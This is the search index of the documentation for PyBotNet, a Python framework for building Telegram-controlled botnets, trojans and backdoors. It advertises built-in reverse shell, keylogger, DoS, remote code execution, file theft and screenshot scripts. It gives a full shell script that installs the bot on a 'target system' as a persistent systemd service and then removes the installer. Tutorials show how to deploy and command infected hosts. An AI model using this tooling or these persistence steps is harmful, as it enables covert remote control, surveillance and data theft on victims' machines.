{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"About","text":"<p> PyBotNet <p>      A Python framework for building remote control, botnet , trojan  or backdoor with Telegram or other control panels     </p> <p> </p> </p> <p>Disclaimer: Please note that this is a research project. I am by no means responsible for any usage of this tool. Use it on your behalf!. </p> <p>Source Code: https://github.com/onionj/pybotnet</p> <p>Documentation: https://onionj.github.io/pybotnet/</p>"},{"location":"#features","title":"Features:","text":"<ul> <li>Built in Telegram control pannel and proxy</li> <li>Built in scripts like:<ul> <li>reverse shell</li> <li>put or get file</li> <li>run python code on target systems</li> <li>get screenshot</li> <li>keylogger</li> <li>dos</li> <li>scheduler</li> <li>...</li> </ul> </li> <li>Cross platform</li> <li>Ability to easily add custom scripts</li> <li>Import external scripts</li> <li>Ability to add custom control panel</li> <li>Add remote control to your apps</li> <li>...</li> </ul> <p>Go to the next page to create the first remote control :)</p>"},{"location":"tutorial_advanced_guide/create_custom_engine/","title":"Create custom engine","text":"<p>comming soon..</p>"},{"location":"tutorial_advanced_guide/linux_crontab/","title":"Linux crontab","text":"<p>comming soon..</p>"},{"location":"tutorial_advanced_guide/linux_services/","title":"Linux services","text":""},{"location":"tutorial_advanced_guide/linux_services/#add-pybotnet-to-debian-base-linux-systemd-service","title":"add pybotnet to Debian base Linux systemd-service","text":""},{"location":"tutorial_advanced_guide/linux_services/#help","title":"HELP:","text":"<ul> <li>replace youre telegram_bot_token, admin_id and bot_name with your own</li> <li>copy this file to target system</li> <li>run this file by <code>sudo sh ./install_as_service.sh</code></li> <li>remove install_as_service.sh from target system</li> <li>if pybotnet update is available, in telegram bot send <code>/shell systemctl restart pybotnet</code> to reinstall pybotnet</li> </ul>"},{"location":"tutorial_advanced_guide/linux_services/#install_as_servicesh","title":"install_as_service.sh","text":"<pre><code>#!/bin/sh\n\ntelegram_bot_token=50885227232:AAFdKCluWopE9Mg-5Mj1WURfuu90cyGssBGY\nadmin_id=49023471166\nbot_name=example_name_pybotnet\n\nservice_name=pybotnet\nrunner=\"/root/.config/.$service_name.sh\"\n\n# Create runner \ntee&lt;&lt;EOF &gt; $runner\n#!/bin/sh\napt-get update &gt; /dev/null 2&gt;&amp;1 &amp;&amp;\napt-get install python3-pip -y -qq &gt; /dev/null 2&gt;&amp;1 &amp;&amp;\napt-get install python3-dev -y -qq &gt; /dev/null 2&gt;&amp;1 &amp;&amp;\npip3 install \"pybotnet&gt;=2&lt;3\" -U -qqq &amp;&amp;\npython3 -m pybotnet -t $telegram_bot_token -i $admin_id -n $bot_name\nEOF\n\nchmod +x $runner\n\ntee&lt;&lt;EOF &gt; /etc/systemd/system/$service_name.service\n[Unit]\nDescription=$service_name\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/sh $runner\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=multi-user.target\nEOF\n\nchmod 644 /etc/systemd/system/$service_name.service\nsystemctl daemon-reload\nsystemctl enable $service_name.service\nsystemctl restart $service_name.service\n</code></pre>"},{"location":"tutorial_advanced_guide/windows_startup/","title":"Windows startup","text":"<p>comming soon..</p>"},{"location":"tutorial_user_guide/add_custom_script/","title":"Add custom script","text":""},{"location":"tutorial_user_guide/add_custom_script/#add-custom-scripts","title":"Add custom scripts","text":"<p>This functionality is for when you want to add your own script.</p> <p>The simplest PyBotNet custom script looks something like this:</p> main.py<pre><code>from pybotnet import BotNet, Context, TelegramEngine\ntelegram_engine = TelegramEngine(token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID) #(1)\nbotnet = BotNet(telegram_engine) # (2)\n# new:\n@botnet.add_script(script_version=\"0.1.0\") # (3)\ndef ping(context: Context): # (4)\n\"\"\"`/ping`\"\"\" # (5)\nresponse = f\"pong {' '.join(context.command)}\" # (6)\nreturn response # (7)\nbotnet.run() # (8)\n</code></pre> <ol> <li>Create engine: Engines transfer messages between user and botnet</li> <li>Create BotNet instance</li> <li>Create new custom script </li> <li>received Context, We will talk about Context below </li> <li>PyBotNet use docstrings to create scripts help </li> <li>Get user command from context and join it to <code>\"pong\"</code>, for example, if user sends <code>/ping foo bar</code> the <code>response</code> will be <code>pong foo bar</code></li> <li>Return response to user</li> <li>Run main loop</li> </ol> <p>As you can see,  We used a decorator to add our script to the botnet instance, now if we execute the code we have access to the ping script in the control panel.</p> <p>Scripts can also contain Context parameters, which include the engine itself, system data, commands sent by the user and etc; We will talk more about Context later</p> <p>Note</p> <ul> <li>PyBotNet use docstrings to create scripts help </li> <li>Context is an optional parameter and if you do not include Context in your function, nothing will happen, but you won't have access to the data sent by the user.</li> <li>If you return <code>None</code>, Nothing will be sent back to the user.</li> </ul>"},{"location":"tutorial_user_guide/add_custom_script/#add_script-decorator","title":"add_script decorator","text":"<p>The program reads the function name and saves it as script name, but you can change the name by setting the script_name variable in the decorator:</p> main.py<pre><code>from pybotnet import BotNet, Context, TelegramEngine\ntelegram_engine = TelegramEngine(token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID)\nbotnet = BotNet(telegram_engine)\n# new:\n@botnet.add_script(script_version=\"0.1.0\", script_name=\"1ping\") # (1)\ndef ping(context: Context): # (2)\n\"\"\"`/1ping`\"\"\"\nreturn f\"pong {' '.join(context.command)}\"\nbotnet.run()\n</code></pre> <ol> <li>Change script name from default (<code>ping</code>) to <code>1ping</code></li> <li>received Context</li> </ol>"},{"location":"tutorial_user_guide/add_custom_script/#context","title":"Context","text":"<p><code>Context</code> is a class that can be received in the script input parameter, This includes the following variables and methods:</p> <ul> <li> <p><code>command</code>: List</p> <ul> <li>For example in the above code if the user sends <code>/1ping foo bar</code>, <code>context.command</code> will return this list: <code>[\"foo\", \"bar\"]</code></li> </ul> </li> <li> <p><code>time_stamp</code>: str</p> <ul> <li>context creation time</li> </ul> </li> <li> <p><code>system_info</code>: callable</p> <p>In scripts, sometimes we need target information, such as IP or MAC address, etc; We can get them with this method.</p> <p>for example <code>context.system_info()</code> returns this data:     <pre><code>scripts_name\nmac_addres\nos\nglobal_ip\nbot_name\nlocal_ip\nhost_name\nsystem_user\nup_time\ncurrent_route\npid\ncpu_count\npybotnet_version\n</code></pre> This method has a flag that if we use it, less data will be returned:     <code>context.system_info(minimal=True)</code> return just minimal data:     <pre><code>scripts_name\nmac_addres\nos\nglobal_ip\nbot_name\n</code></pre></p> <p>system_info method cache data for 30s</p> </li> <li> <p><code>engine</code>:</p> <p>This variable returns the active engine,  (Engines transfer messages between user and botnet, for example we used build in TelegramEngine in the above code, You can create custom engines. We will talk about it in the advanced part of the document)</p> <p>engines have <code>send()</code>, <code>receive()</code> and <code>send_file()</code> methods;     You can use them to communicate with the user.</p> <ul> <li> <p><code>send</code> method takes two parameter, a string (required) and dict (optional) for adding it to the submessagse     You can send <code>context.system_info(minimal=True)</code> to the second parameter</p> </li> <li> <p><code>send_file</code> like <code>send</code> method takes two parametr, first parametr gets the route of the file (required), and the second takes a dict (optional) for add it to sub of message..</p> </li> <li> <p><code>recive</code> return not procesed user command as a list of string, and if not found new user command, return <code>False</code></p> </li> </ul> <p>Engines</p> <ul> <li>PyBotNet currently has three engines:<ul> <li><code>BaseEngine</code>: abstract Engine</li> <li><code>TestEngine</code></li> <li><code>TelegramEngine</code></li> </ul> </li> </ul> </li> <li> <p><code>meta_data</code>: dict</p> <ul> <li>this variable contains current <code>script_name</code>, <code>script_version</code> and <code>script_doc</code> </li> </ul> </li> <li> <p>global values:</p> <p>Sometimes we need to set a variable that can be accessed from anywhere in the program; You can use these two methods to do this:</p> <ul> <li> <p><code>set_global_value</code>: callable     With this method you can save data in temp memory</p> </li> <li> <p><code>get_global_value</code>: callable     Takes a key and returns the data</p> </li> </ul> <p>For example, if we want to store a variable in script A and use it in script B:</p> <p>in script A we set value:     <code>set_global_value(\"message_from_A\", \"hi\")</code> and in script B we get value:     <code>get_global_value(\"message_from_A\")</code></p> </li> </ul>"},{"location":"tutorial_user_guide/add_custom_script/#userexception","title":"UserException","text":"<p>If input data from user (PyBotNet gets it from <code>context.command</code> or in script call <code>context.engine.recive()</code>) was not valid, PyBotNet will raise an <code>UserException</code> say: <code>raise UserException(\"the reason\")</code> </p> <p>PyBotNet <code>simple_serializer</code> to validate user input data, this function checks len, type of the data and if is ok return a list of converted command by new types..</p> main.py<pre><code>from pybotnet import BotNet, Context, TelegramEngine, simple_serializer # (1)\ntelegram_engine = TelegramEngine(token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID)\nbotnet = BotNet(telegram_engine)\n@botnet.add_script()\ndef echo(context: Context):\n\"\"\"`/echo &lt;number&gt; &lt;word&gt;`\"\"\"\ncommand, err = simple_serializer(context.command, [int, str]) # (2)\nif err: \nraise UserException(err) # (3)\n# (4)\nnumber = command[0]\nword = command[1]\nfor _ in range(number):\nprint(word)\n# (5)\nbotnet.run()\n</code></pre> <ol> <li>Import simple_serializer from pybotnet</li> <li>sends user command with excepted types to simple_serializer</li> <li>Send error details to user</li> <li>This is the data returned from simple_serializer, and it has new data types.</li> <li>This script dosen't return anything, (by default python returns <code>None</code>) so it won't send back any responses to the user</li> </ol>"},{"location":"tutorial_user_guide/config_BotNet_class/","title":"config BotNet class","text":"<p>you can change some config from <code>BotNet</code> class</p> <p>Example:</p> main.py<pre><code>from pybotnet import BotNet, TelegramEngine\ntelegram_engine = TelegramEngine(token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID)\nbotnet = BotNet(\ntelegram_engine, # (1)\nbot_name=\"my_pc\", # (2)\ndelay=1.5, # (3)\nuse_default_scripts=True, # (4)\nstart_end_notify=True, # (5)\ndebug=False # (6)\n)\nbotnet.run()\n</code></pre> <ol> <li>Positional parameter engine</li> <li>Custom name for this instance, like <code>mac_addres</code> you can run command just in this instance by bot_name, example: <code>my_pc /who</code></li> <li>sleep in main_loop</li> <li>use build in scripts, default is <code>True</code></li> <li>Send a message to the user when the program is running or stopped, default is <code>True</code></li> <li>show logs by log level <code>debug</code>!, default is <code>False</code></li> </ol>"},{"location":"tutorial_user_guide/external_scripts/","title":"External scripts","text":"<p>You can write a series of scripts outside the main file and add it to your botnet by importing <code>ExternalScripts</code></p> <p>For example:</p> external_scripts.py<pre><code>from pybotnet import ExternalScripts, Context # (1)\nexternal_botnet = ExternalScripts() # (2)\n@external_botnet.add_script() # (3)\ndef hello_world():\n\"\"\"return hello_world\"\"\"\nreturn \"hello_world\"\n@external_botnet.add_script(script_name='sys_data', script_version=\"0.1.0\") # (4)\ndef get_system_info(context: Context):\n\"\"\"return system_info\"\"\"\nsys_data = \"\"\nfor key, value in context.system_info().items():\nsys_data += f\"{key}: {value}\\n\"\nreturn sys_data\n</code></pre> <ol> <li>import <code>ExternalScripts</code> from pybotnet</li> <li>Create <code>ExternalScripts</code> instance</li> <li>Add some simple script</li> <li>Create other script..</li> </ol> <p>In the above code we created an instance of <code>ExternalScripts</code> (this is a <code>botNet</code> child) and added our scripts..</p> main.py<pre><code>from pybotnet import BotNet, TelegramEngine\nfrom external_scripts import external_botnet # (1)\ntelegram_engine = TelegramEngine(token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID)\nbotnet = BotNet(telegram_engine)\nbotnet.import_external_scripts(external_botnet) # (2)\nbotnet.run() # (3) \n</code></pre> <ol> <li>Import <code>external_botnet</code> from <code>external_scripts.py</code></li> <li>add external scripts to our <code>botnet</code> instance</li> <li>or you can use botnet.run_background(), botnet.stop_background()</li> </ol> <p>import <code>external_botnet</code> from <code>external_script.py</code> and add external scripts to <code>botnet</code> by call <code>botnet.import_external_scripts(external_botnet)</code></p>"},{"location":"tutorial_user_guide/run_in_background/","title":"Run in background","text":"<p>botnet in background, Example:</p> main.py<pre><code>import time\nfrom pybotnet import BotNet, TelegramEngine\ntelegram_engine = TelegramEngine(token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID)\nbotnet = BotNet(telegram_engine)\nbotnet.run_background() # (1)\ntime.sleep(10) # (2)\nbotnet.stop_background() # (3)\n</code></pre> <ol> <li>run botnet in background</li> <li>just wait for 10s </li> <li>stop botnet</li> </ol> <p>in above example we run botnet in backgrund, wait for 10s and stop it! </p>"},{"location":"tutorial_user_guide/running_pybotnet_without_coding/","title":"Running pybotnet without coding","text":"<p>We have seen before that we need some code to run pybotnet, but it is possible to run pybotnet as a module</p> <p>All you have to do is, install PyBotNet on your system and enter the following command in your terminal:</p>"},{"location":"tutorial_user_guide/running_pybotnet_without_coding/#install-pybotnet","title":"Install PyBotNet:","text":"<pre><code>pip3 install pybotnet -U\n</code></pre> <p>Note</p> <p><code>-U</code>: make sure to upgrade framework to latest version.</p>"},{"location":"tutorial_user_guide/running_pybotnet_without_coding/#run-pybotnet","title":"Run PyBotNet:","text":"<pre><code>python3 -m pybotnet -t [TELEGRAM_TOKEN] -i [ADMIN_CHAT_ID] -n [BOT NAME]\n</code></pre> <p>For example :</p> <pre><code>python3 -m pybotnet -t 5526760482:AAGweoNtLrHEsasxnklwhjms78ytPS3U8gEO6asc -i 5590231667 -n test\n</code></pre> <p>Note</p> <ul> <li><code>TELEGRAM_TOKEN</code>: You can use telegram <code>@botfather</code> to create new telegram API Bot and get your <code>TELEGRAM_TOKEN</code> </li> <li><code>ADMIN_CHAT_ID</code>: Get it from @userinfobot Telegram bot</li> <li>PyBotNet include default scripts, like: <code>/shell</code>, <code>/put_file</code>, <code>/get_file</code>, <code>/screenshot</code>, <code>/who</code>, ...,  you can send <code>/help</code> to your telegram bot and see more detail..</li> </ul>"},{"location":"tutorial_user_guide/simple_usage/","title":"Simple usage","text":""},{"location":"tutorial_user_guide/simple_usage/#install-pybotnet","title":"Install PyBotNet","text":"<pre><code>pip3 install pybotnet -U\n</code></pre> <p>Note</p> <p><code>-U</code>: make sure to upgrade framework to latest version.</p>"},{"location":"tutorial_user_guide/simple_usage/#the-simplest-pybotnet-file-could-look-like-this","title":"The simplest PyBotNet file could look like this:","text":"main.py<pre><code>from pybotnet import BotNet, TelegramEngine\ntelegram_engine = TelegramEngine(token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID) #(1)\nbotnet = BotNet(telegram_engine) # (2)\nbotnet.run()\n</code></pre> <ol> <li>create engine: Engines transfer messages between admin and botnet</li> <li>create BotNet instance</li> </ol> <p>Note</p> <ul> <li><code>TELEGRAM_TOKEN</code>: You can use telegram <code>@botfather</code> to Create new telegram API Bot and get your <code>TELEGRAM_TOKEN</code> </li> <li><code>ADMIN_CHAT_ID</code>: Get it from @userinfobot telegram bot</li> <li>PyBotNet include default scripts, like: <code>/shell</code>, <code>/put_file</code>, <code>/get_file</code>, <code>/screenshot</code>, <code>/who</code>, ...,  you can send <code>/help</code> to your telegram bot and see more detail..</li> </ul>"},{"location":"tutorial_user_guide/simple_usage/#run-code","title":"Run code:","text":"<pre><code>python3 main.py\n</code></pre>"},{"location":"tutorial_user_guide/simple_usage/#telegram-engine","title":"telegram engine","text":"<p>open telegram and send <code>/who</code> to your bot; If you have done the steps correctly, you recive message like this:</p> <pre><code>scripts_name:\n    echo\n    who\n    shell\n    screenshot\n    put_file\n    get_file\n    runcode\n    openurl\n    dos\n    schedule\n\nmac_addres: 228362405364\nos: Linux\nglobal_ip: 5.10.30.35\ncountry: Iran, Islamic Republic of\nbot_name: no_name\nlocal_ip: {'192.168.23.1'}\nhost_name: {'system_name'}\nsystem_user: root\nup_time: 0:00:01\ncurrent_route: /\npid: 148352\ncpu_count: 8\npybotnet_version: 2.0.8b0\nfrom cache: True\n</code></pre> <p>you can send <code>/help</code> to see help page, or send <code>/help &lt;script_name&gt;</code> to recive more help about specific script.</p> <p>for example send <code>/help screenshot</code>, You will receive:</p> <pre><code>NAME:\nscreenshot\n\nDESCRIPTION:\nget screen shot\n    * `[mac-address] /screenshot`\n    or\n    * `/screenshot`\n\n    example command: \n        * `94945035671481 /screenshot`\n        * `/screenshot` \n\n    return: img or img-download-link\n\nscript_version: 0.0.1\ndefault_script: True\n\n___________________________\nscripts_name: ['echo', 'who', 'shell', 'screenshot', 'put_file', 'get_file', 'runcode', 'openurl', 'dos', 'schedule']\nmac_addres: 228362405364\nos: Linux\nglobal_ip: 5.10.30.35\ncountry: Iran, Islamic Republic of\nbot_name: no_name\nuse_proxy: False\n</code></pre> <p>in top of message you see script name, description, syntax and examples.</p> <p>for run screenshot script you have two choice:</p> <ul> <li>Run the script on all clients that are listening to Telegram bot (for now we have one!)</li> <li>Run script on one specific system</li> </ul> <p>for run script on all client send <code>/screenshot</code>.</p> <p>bot if you need get screen shot on specific system you need send <code>[mac_addres] /screenshot</code> for our case: <code>228362405364 /screenshot</code></p> <p>in some case like <code>/shell</code> you need to run it just for one system.</p>"}]}